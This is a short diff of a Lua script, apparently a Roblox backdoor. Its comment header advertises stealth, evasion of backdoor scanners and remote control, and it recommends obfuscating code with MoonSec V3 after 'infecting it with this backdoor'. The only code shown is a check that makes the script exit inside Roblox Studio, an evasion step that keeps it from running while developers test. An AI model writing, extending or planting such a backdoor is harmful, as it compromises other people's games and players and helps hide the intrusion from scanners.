@@ -6,11 +6,11 @@
 -- Features we have:
 -- -- Anti-tamper remote
 -- -- Compatibility with any backdoor scanner
--- -- Multiple code execution support 
 -- -- Stealthiness 
--- -- Shortcuts (%username%, %userid%)
+-- -- Shortcuts (%username%, %userid%, %userpath%)
 
 -- IT IS RECOMMENDED TO OBFUSCATE THE CODE AFTER INFECTING IT WITH THIS BACKDOOR
+-- I RECOMMEND USING MOONSEC V3 TO OBFUSCATE
 
 if game:GetService("RunService"):IsStudio() then 
 	return 
